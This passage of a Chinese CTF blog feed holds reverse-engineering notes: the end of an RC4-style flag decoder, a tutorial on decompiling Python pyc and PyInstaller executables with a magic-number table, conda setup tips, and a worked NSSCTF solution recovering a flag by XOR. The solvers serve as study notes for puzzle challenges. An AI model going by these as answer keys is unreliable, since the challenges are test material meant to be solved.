处理密钥<br>processed_key = [ord(i) ^ 102 for i in key]<br><br># RC4 类似的流密码算法构建<br>s = list(range(256))<br>j = 0<br>for i in range(256):<br>    j = (j + s[i] + processed_key[i % len(processed_key)]) % 256<br>    s[i], s[j] = s[j], s[i]<br><br># 生成数据流 `data`<br>i = j = 0<br>data = []<br>for _ in range(50):  # 生成50个密钥流字节<br>    i = (i + 1) % 256<br>    j = (j + s[i]) % 256<br>    s[i], s[j] = s[j], s[i]<br>    data.append(s[(s[i] + s[j]) % 256])<br><br># 解码 `encoded_target` 并转换为原始字符串<br>target_bytes = base64.b64decode(encoded_target).decode()<br>decoded_text = &#x27;&#x27;<br><br># 使用 `data` 对 `target_bytes` 进行解码<br>for c, k in zip(target_bytes, data):<br>    decoded_text += chr((ord(c) ^ k) ^ 51)<br><br>print(&quot;Decoded text (flag):&quot;, decoded_text)<br></code></pre></td></tr></table></figure><p><font style="color:rgb(35, 38, 59);"></font></p><blockquote><p>更新: 2024-11-13 15:04:10<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ufab0dsoga8tbf42">https://www.yuque.com/chaye-apqbl/vsc85q/ufab0dsoga8tbf42</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/index/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/index/</url>
    
    <content type="html"><![CDATA[<h1 id="python反编译"><a href="#python反编译" class="headerlink" title="python反编译"></a>python反编译</h1><p><font style="color:rgb(0,0,0);"> </font></p><p><font style="color:rgb(17,124,238);">出题 </font></p><p><font style="color:rgb(17,124,238);"><a href="https://www.nssctf.cn/problem/2038">https://www.nssctf.cn/problem/2038</a> </font></p><p><font style="color:rgb(38,38,38);">参考链接：</font><font style="color:rgb(17,124,238);"><a href="https://www.nssctf.cn/note/set/1517">https://www.nssctf.cn/note/set/1517</a> </font></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景 "></a><font style="color:rgb(38,38,38);">背景 </font></h2><p><font style="color:rgb(38,38,38);">pyc⽂件格式 </font></p><p><font style="color:rgb(38,38,38);">magic number + 源代码⽂件信息 + PyCodeObject </font></p><p><font style="color:rgb(38,38,38);">4 个字节的 magic number </font></p><p><font style="color:rgb(38,38,38);">12 个字节的源代码⽂件信息（不同版本的 Python 包含的⻓度和信息都不⼀样） </font></p><p><font style="color:rgb(38,38,38);">序列化之后的 PyCodeObject </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715258388561-53814a84-a349-4923-ba8f-e226a50378d3-137374.png" alt="1715258388561-53814a84-a349-4923-ba8f-e226a50378d3.png"></p><p><font style="color:rgb(18,18,18);">Python 是⼀种解释型语⾔，它不像编译型语⾔那样将源代码直接编译成机器码执⾏。Python 的解释器 </font></p><p><font style="color:rgb(18,18,18);">会在运⾏代码之前先将源代码编译成字节码，然后将字节码解释执⾏。pyc ⽂件就是这个过程中⽣成的 </font></p><p><font style="color:rgb(18,18,18);">字节码⽂件。 </font></p><p><font style="color:rgb(18,18,18);">当 Python 解释器⾸次执⾏⼀个 .py ⽂件时，它会在同⼀⽬录下⽣成⼀个对应的 pyc ⽂件，以便于下次 </font></p><p><font style="color:rgb(18,18,18);">加载该⽂件时可以更快地执⾏。如果源⽂件在修改之后被重新加载，解释器会重新⽣成pyc ⽂件以更新 </font></p><p><font style="color:rgb(18,18,18);">缓存的字节码 </font></p><p><font style="color:rgb(38,38,38);">⼀般需要反编译的附件查壳都会有如下红⾊标志</font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715258505023-1668a2fb-5c28-42d4-8e8e-4471fb6c7079-121638.png" alt="1715258505023-1668a2fb-5c28-42d4-8e8e-4471fb6c7079.png"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><p><font style="color:rgb(38,38,38);">uncompyle6 现仅适⽤于 Python 2.4 到 3.8 版本，3.8 及以上版本使⽤ pycdc ，3.8左右版本两者都可 </font></p><p><font style="color:rgb(38,38,38);">以试试 </font></p><p><font style="color:rgb(38,38,38);">uncompyle6安装要python版本对应（不能太⾼），我⽤anaconda创建虚拟环境 </font></p><p><font style="color:rgb(38,38,38);">uncompyle： </font><font style="color:rgb(38,38,38);">uncompyle6 </font></p><p><font style="color:rgb(38,38,38);">⽂件名</font><font style="color:rgb(38,38,38);">.pyc &gt; </font><font style="color:rgb(38,38,38);">⽂件名</font><font style="color:rgb(38,38,38);">.py </font></p><p><font style="color:rgb(38,38,38);">pycdc： </font><font style="color:rgb(38,38,38);">.&#x2F;pycdc.exe </font><font style="color:rgb(38,38,38);">⽂件名 </font></p><p><font style="color:rgb(17,124,238);"><a href="https://github.com/extremecoders-re/decompyle-builds/releases/tag/build-14-Nov-2023-">https://github.com/extremecoders-re/decompyle-builds/releases/tag/build-14-Nov-2023-</a> </font></p><p><font style="color:rgb(17,124,238);">5936412 </font></p><p><font style="color:rgb(38,38,38);">下载地址如上 </font></p><h3 id="在线"><a href="#在线" class="headerlink" title="在线"></a><font style="color:rgb(38,38,38);">在线</font></h3><p><font style="color:rgb(38,38,38);">贴两个⽐较好⽤的在线⽹站 </font></p><p><font style="color:rgb(17,124,238);"><a href="https://www.toolkk.com/tools/pyc-decomplie#google_vignette">https://www.toolkk.com/tools/pyc-decomplie#google_vignette</a> </font></p><p><font style="color:rgb(17,124,238);"><a href="https://tool.lu/pyc">https://tool.lu/pyc</a> </font></p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a><font style="color:#000000;">目标</font></h2><h3 id="1-exe⽂件变成pyc⽂件"><a href="#1-exe⽂件变成pyc⽂件" class="headerlink" title="1.exe⽂件变成pyc⽂件 "></a><font style="color:rgb(38,38,38);">1.exe⽂件变成pyc⽂件 </font></h3><p><font style="color:rgb(38,38,38);">⾸先，先将 pyinstxtractor.py ⼯具与我们要反编译的 .exe ⽂件放⼊同⼀个⼯作⽬录下： </font></p><p><font style="color:rgb(38,38,38);">在上述⽬录打开终端： </font><font style="color:rgb(38,38,38);">python pyinstxtractor.py </font><font style="color:rgb(38,38,38);">⽂件名</font><font style="color:rgb(38,38,38);">.exe </font></p><p><font style="color:rgb(38,38,38);">有些附件不清楚格式可以到kali下file命令查看或者⽤IDA打开发现如下字样，也暗示要反编译 </font></p><p><font style="color:rgb(38,38,38);"></font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715258624795-2086050d-a431-413e-8f1c-1b97eab74e67-248488.png" alt="1715258624795-2086050d-a431-413e-8f1c-1b97eab74e67.png"></p><p><font style="color:rgb(38,38,38);">说明版本是python3.7的 </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715258642956-9f079c6b-76d4-4507-a9fe-2a9e47eae62a-806634.png" alt="1715258642956-9f079c6b-76d4-4507-a9fe-2a9e47eae62a.png"></p><p><font style="color:rgb(38,38,38);">运⾏完成后，在此⽂件夹下我们会发现多了⼀个 ⽂件名.exe_extracted 的⽂件夹 </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715258655829-7d5b192e-bef9-4686-8e66-0894531f5c4c-998362.png" alt="1715258655829-7d5b192e-bef9-4686-8e66-0894531f5c4c.png"></p><p><font style="color:rgb(38,38,38);">⽬录⾥有两个没有后缀的⽂件，这就是反编译的重点 </font></p><p><font style="color:rgb(38,38,38);">总体上还是找那些没有后缀的⽂件 </font></p><p><font style="color:rgb(38,38,38);">为src⽂件添加.pyc的后缀，并⽤winhex打开src和struct⽂件 </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715258675431-342e6ef3-b699-4772-8655-1558dd19811e-471404.png" alt="1715258675431-342e6ef3-b699-4772-8655-1558dd19811e.png"></p><p><font style="color:rgb(89,89,89);"></font><font style="color:rgb(38,38,38);">注意，直接将src添加.pyc后缀后所编译的py⽂件是缺少Magic Number的，所以我们要⽤struct⽂件的 </font></p><p><font style="color:rgb(38,38,38);">⽂件头来修复src⽂件的⽂件头 </font></p><p><font style="color:rgb(38,38,38);">由于src⽂件直接是以E3开头的，所以我们这⾥直接将struct⽂件E3前⾯的11字节复制到src⽂件的⽂件头 </font></p><p><font style="color:rgb(38,38,38);">就可以了；如果不是直接以E3开头，就⽐较两个⽂件E3前⾯的字节，将src⽂件E3前⾯的字节改为struct </font></p><p><font style="color:rgb(38,38,38);">⽂件E3前⾯的字节即可（这⾥只是针对这道题，其他题⽂件头通常都不⼀样） </font></p><h3 id="2-pyc⽂件变成py⽂件"><a href="#2-pyc⽂件变成py⽂件" class="headerlink" title="2.pyc⽂件变成py⽂件 "></a><font style="color:rgb(38,38,38);">2.pyc⽂件变成py⽂件 </font></h3><p><font style="color:rgb(38,38,38);">开启虚拟环境： </font><font style="color:rgb(38,38,38);">uncompyle6 </font><font style="color:rgb(38,38,38);">⽂件名</font><font style="color:rgb(38,38,38);">.pyc &gt; </font><font style="color:rgb(38,38,38);">⽂件名</font><font style="color:rgb(38,38,38);">.py </font></p><p><font style="color:rgb(38,38,38);">前提python版本要⼀样 </font></p><h2 id="magic修复"><a href="#magic修复" class="headerlink" title="magic修复 "></a><font style="color:rgb(89,89,89);"></font><font style="color:rgb(38,38,38);">magic修复 </font></h2><p><font style="color:rgb(38,38,38);">适合已知</font><font style="color:rgb(38,38,38);">python</font><font style="color:rgb(38,38,38);">版本的题⽬ </font></p><p><font style="color:rgb(38,38,38);">放到winhex⾥可以发现E3前⾯全是0，正常的pyc⽂件E3前⾯包含Magic Number和时间戳 </font></p><p><font style="color:rgb(38,38,38);">1.Python3.3以下的版本中，只有Magic Number和四位时间戳 </font></p><p><font style="color:rgb(38,38,38);">2.Python3.3到Python3.7（不包含3.7）版本中，只有Magic Number和⼋位时间戳 + ⼤⼩信息 </font></p><p><font style="color:rgb(38,38,38);">3.Python3.7及以上版本的编译后⼆进制⽂件中，头部除了四字节Magic Number，还有四个字节的空位 </font></p><p><font style="color:rgb(38,38,38);">和⼋个字节的时间戳 + ⼤⼩信息，时间戳填充0即可 </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715259152965-d1e2718e-9293-4e9f-ba36-c39dca615380-109381.png" alt="1715259152965-d1e2718e-9293-4e9f-ba36-c39dca615380.png"></p><h2 id="pyc版本号参考"><a href="#pyc版本号参考" class="headerlink" title="pyc版本号参考 "></a><font style="color:rgb(38,38,38);">pyc版本号参考 </font></h2><p><font style="color:rgb(38,38,38);">补全的时候是⼩端序，记得颠倒过来，只改前四个字节就可以，⽐如3.7版本先42再0A </font></p><p><font style="color:rgb(38,38,38);">这⾥抄⼀下⽹上的magic number </font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">PycMagic</span> &#123;</span><br> MAGIC_1_0 = <span class="hljs-number">0x00999902</span>,<br> MAGIC_1_1 = <span class="hljs-number">0x00999903</span>, <span class="hljs-comment">/* Also covers 1.2 */</span><br> MAGIC_1_3 = <span class="hljs-number">0x0A0D2E89</span>,<br> MAGIC_1_4 = <span class="hljs-number">0x0A0D1704</span>,<br> MAGIC_1_5 = <span class="hljs-number">0x0A0D4E99</span>,<br> MAGIC_1_6 = <span class="hljs-number">0x0A0DC4FC</span>,<br> MAGIC_2_0 = <span class="hljs-number">0x0A0DC687</span>,<br> MAGIC_2_1 = <span class="hljs-number">0x0A0DEB2A</span>,<br> MAGIC_2_2 = <span class="hljs-number">0x0A0DED2D</span>,<br> MAGIC_2_3 = <span class="hljs-number">0x0A0DF23B</span>,<br> MAGIC_2_4 = <span class="hljs-number">0x0A0DF26D</span>,<br> MAGIC_2_5 = <span class="hljs-number">0x0A0DF2B3</span>,<br> MAGIC_2_6 = <span class="hljs-number">0x0A0DF2D1</span>,<br> MAGIC_2_7 = <span class="hljs-number">0x0A0DF303</span>,<br> MAGIC_3_0 = <span class="hljs-number">0x0A0D0C3A</span>,<br> MAGIC_3_1 = <span class="hljs-number">0x0A0D0C4E</span>,<br> MAGIC_3_2 = <span class="hljs-number">0x0A0D0C6C</span>,<br> MAGIC_3_3 = <span class="hljs-number">0x0A0D0C9E</span>,<br> MAGIC_3_4 = <span class="hljs-number">0x0A0D0CEE</span>,<br> MAGIC_3_5 = <span class="hljs-number">0x0A0D0D16</span>,<br> MAGIC_3_5_3 = <span class="hljs-number">0x0A0D0D17</span>,<br> MAGIC_3_6 = <span class="hljs-number">0x0A0D0D33</span>,<br> MAGIC_3_7 = <span class="hljs-number">0x0A0D0D42</span>,<br> MAGIC_3_8 = <span class="hljs-number">0x0A0D0D55</span>,<br> MAGIC_3_9 = <span class="hljs-number">0x0A0D0D61</span>,<br> MAGIC_3_10 = <span class="hljs-number">0x0A0D0D6F</span>,<br> MAGIC_3_11 = <span class="hljs-number">0x0A0D0DA7</span><br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(38,38,38);">可以看已有版本的magic number</font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715259278773-3ff92c0e-1239-4d85-a7eb-098a2fd71a44-575333.png" alt="1715259278773-3ff92c0e-1239-4d85-a7eb-098a2fd71a44.png"></p><p><font style="color:rgb(38,38,38);">import importlib </font></p><p><font style="color:rgb(38,38,38);">importlib.util.MAGIC_NUMBER.hex()</font></p><h1 id="出题"><a href="#出题" class="headerlink" title="出题 "></a><font style="color:rgb(140,140,140);"></font><font style="color:rgb(38,38,38);">出题 </font></h1><p><font style="color:rgb(18,18,18);">⽣成pyc： </font><font style="color:rgb(18,18,18);">python -m </font><font style="color:rgb(18,18,18);">⽂件名 </font></p><p><font style="color:rgb(18,18,18);">即使有报错也能⽣成 </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715259329466-ce0288d1-ef6f-4566-9dca-5a8e01d332b3-864182.png" alt="1715259329466-ce0288d1-ef6f-4566-9dca-5a8e01d332b3.png"></p><p><font style="color:rgb(38,38,38);">如果是另外python版本可以⽤下⾯这种 </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715259353666-2218578a-8ca7-40eb-86ee-452d8e5c359a-783858.png" alt="1715259353666-2218578a-8ca7-40eb-86ee-452d8e5c359a.png"></p><p><font style="color:rgb(89,89,89);"></font><font style="color:rgb(38,38,38);">⽣成exe： pyinstaller -F tmp.py </font></p><p><img src="/./img/49277317_1IzarV8UyXZsp7of/1715259365833-f9bb93a6-7f58-40de-9858-4df0b40dc823-235691.png" alt="1715259365833-f9bb93a6-7f58-40de-9858-4df0b40dc823.png"></p><p><font style="color:rgb(89,89,89);"></font></p><blockquote><p>更新: 2024-05-09 20:56:20<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/svmmqlvdm0b8tzyu">https://www.yuque.com/chaye-apqbl/vsc85q/svmmqlvdm0b8tzyu</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/conda%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/conda%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="conda创建虚拟环境"><a href="#conda创建虚拟环境" class="headerlink" title="conda创建虚拟环境"></a>conda创建虚拟环境</h1><p>注意新开终端后要重新启动</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">conda create -n py38 python==<span class="hljs-number">3.8</span>  <span class="hljs-comment">//创建虚拟环境</span><br>conda activate py38     <span class="hljs-comment">//开启虚拟环境</span><br>conda deactivate py38  <span class="hljs-comment">//关闭虚拟环境</span><br>conda remove --name py38 --all <span class="hljs-comment">// 删除虚拟环境</span><br>  <br>如果只删除虚拟环境中的某个或者某些包则是：<br>conda remove --name env_name  package_name<br></code></pre></td></tr></table></figure><p>前面出现</p><p>（base）就说明启动成功</p><h2 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h2><p><img src="/./img/CU87zGv_lGPcSCrH/1757840994583-3b25de31-8c5c-428e-ac62-02199ae1438e-138891.png" alt="1757840994583-3b25de31-8c5c-428e-ac62-02199ae1438e.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">Windows PowerShell<br>版权所有（C） Microsoft Corporation。保留所有权利。<br> <br>安装最新的 PowerShell，了解新功能和改进！https:<span class="hljs-comment">//aka.ms/PSWindows</span><br> <br>. : 无法加载文件 C:\Users\xxx\Documents\WindowsPowerShell\profile.ps1，因为在此系统上禁止运行脚本。有关详细信息，请<br>参阅 https:/go.microsoft.com/fwlink/?LinkID=<span class="hljs-number">135170</span> 中的 about_Execution_Policies。<br>所在位置 行:<span class="hljs-number">1</span> 字符: <span class="hljs-number">3</span><br>+ . <span class="hljs-string">&#x27;C:\Users\xxx\Documents\WindowsPowerShell\profile.ps1&#x27;</span><br>+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : SecurityError: (:) []，PSSecurityException<br>    + FullyQualifiedErrorId : UnauthorizedAccess<br>PS C:\Users\xxx&gt; conda init powershell<br>no change     I:\anaconda\Scripts\conda.exe<br>no change     I:\anaconda\Scripts\conda-env.exe<br>no change     I:\anaconda\Scripts\conda-script.py<br>no change     I:\anaconda\Scripts\conda-env-script.py<br>no change     I:\anaconda\condabin\conda.bat<br>no change     I:\anaconda\Library\bin\conda.bat<br>no change     I:\anaconda\condabin\_conda_activate.bat<br>no change     I:\anaconda\condabin\rename_tmp.bat<br>no change     I:\anaconda\condabin\conda_auto_activate.bat<br>no change     I:\anaconda\condabin\conda_hook.bat<br>no change     I:\anaconda\Scripts\activate.bat<br>no change     I:\anaconda\condabin\activate.bat<br>no change     I:\anaconda\condabin\deactivate.bat<br>needs sudo    I:\anaconda\Scripts\activate<br>needs sudo    I:\anaconda\Scripts\deactivate<br>needs sudo    I:\anaconda\etc\profile.d\conda.sh<br>needs sudo    I:\anaconda\etc\fish\conf.d\conda.fish<br>no change     I:\anaconda\shell\condabin\Conda.psm1<br>needs sudo    I:\anaconda\shell\condabin\conda-hook.ps1<br>no change     I:\anaconda\Lib\site-packages\xontrib\conda.xsh<br>needs sudo    I:\anaconda\etc\profile.d\conda.csh<br>no change     C:\Users\xxx\Documents\WindowsPowerShell\profile.ps1<br>No action taken.   <br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">如何解决：</font></p><p><font style="color:rgb(77, 77, 77);">打开</font><font style="color:rgb(78, 161, 219) !important;">PowerShell</font><font style="color:rgb(77, 77, 77);">，运行</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Set</span><span class="hljs-operator">-</span>ExecutionPolicy RemoteSigned <span class="hljs-operator">-</span><span class="hljs-keyword">Scope</span> CurrentUser<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="nssctf入门pyc"><a href="#nssctf入门pyc" class="headerlink" title="nssctf入门pyc"></a>nssctf入门pyc</h2><p>查看是py312magic头</p><p>conda create -n py312 python&#x3D;&#x3D;3.12</p><p>conda activate py312</p><h3 id="要去对应的py版本下面反汇编才能出现额外pyc"><a href="#要去对应的py版本下面反汇编才能出现额外pyc" class="headerlink" title="要去对应的py版本下面反汇编才能出现额外pyc"></a>要去对应的py版本下面反汇编才能出现额外pyc</h3><p>python .\pyinstxtractor.py 1.exe</p><p><img src="/./img/CU87zGv_lGPcSCrH/1757841634727-b1e19a1e-6fb0-47ca-9f27-87dbca0b7356-250780.png" alt="1757841634727-b1e19a1e-6fb0-47ca-9f27-87dbca0b7356.png"></p><p>pycdc.exe main.pyc &gt; main.py</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Source Generated with Decompyle++</span><br><span class="hljs-comment"># File: main.pyc (Python 3.12)</span><br><br>import extra<br>user_input = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;plz input flag: &#x27;</span>)<br>res = []<br>enc = [<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">41</span>,<br>    <span class="hljs-number">41</span>,<br>    <span class="hljs-number">57</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">60</span>,<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">10</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">25</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">19</span>,<br>    <span class="hljs-number">9</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">10</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">18</span>,<br>    <span class="hljs-number">21</span>,<br>    <span class="hljs-number">20</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">24</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">31</span>,<br>    <span class="hljs-number">25</span>,<br>    <span class="hljs-number">21</span>,<br>    <span class="hljs-number">30</span>,<br>    <span class="hljs-number">31</span>,<br>    <span class="hljs-number">7</span>]<br><span class="hljs-keyword">for</span> i in user_input:<br>    res.<span class="hljs-title function_ invoke__">append</span>(extra.<span class="hljs-title function_ invoke__">cul</span>(<span class="hljs-title function_ invoke__">ord</span>(i)))<br><span class="hljs-keyword">for</span> j in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-title function_ invoke__">len</span>(res)):<br>    <span class="hljs-keyword">if</span> not res[j] != enc[j]:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;Wrong flag!&#x27;</span>)<br>    <span class="hljs-keyword">exit</span>()<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;You get flag!&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>找到extra.pyc</p><p><img src="/./img/CU87zGv_lGPcSCrH/1757841434048-60b1ab00-4e80-4901-8168-b61bcd74140e-233885.png" alt="1757841434048-60b1ab00-4e80-4901-8168-b61bcd74140e.png"></p><p><img src="/./img/CU87zGv_lGPcSCrH/1757841657596-aaeb0ef5-45f6-47c3-8153-199b6c354f00-353802.png" alt="1757841657596-aaeb0ef5-45f6-47c3-8153-199b6c354f00.png"></p><p><img src="/./img/CU87zGv_lGPcSCrH/1757841714499-d391c22c-bce5-446b-9f33-dcfde71ad850-428020.png" alt="1757841714499-d391c22c-bce5-446b-9f33-dcfde71ad850.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">41</span>,<br>    <span class="hljs-number">41</span>,<br>    <span class="hljs-number">57</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">60</span>,<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">10</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">25</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">19</span>,<br>    <span class="hljs-number">9</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">10</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">18</span>,<br>    <span class="hljs-number">21</span>,<br>    <span class="hljs-number">20</span>,<br>    <span class="hljs-number">37</span>,<br>    <span class="hljs-number">24</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">31</span>,<br>    <span class="hljs-number">25</span>,<br>    <span class="hljs-number">21</span>,<br>    <span class="hljs-number">30</span>,<br>    <span class="hljs-number">31</span>,<br>    <span class="hljs-number">7</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">122</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-09-29 14:40:10<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fht6xfvt7cwrnlp3">https://www.yuque.com/chaye-apqbl/vsc85q/fht6xfvt7cwrnlp3</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/vbs%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/vbs%E9%80%86%E5%90%91/</url>
    
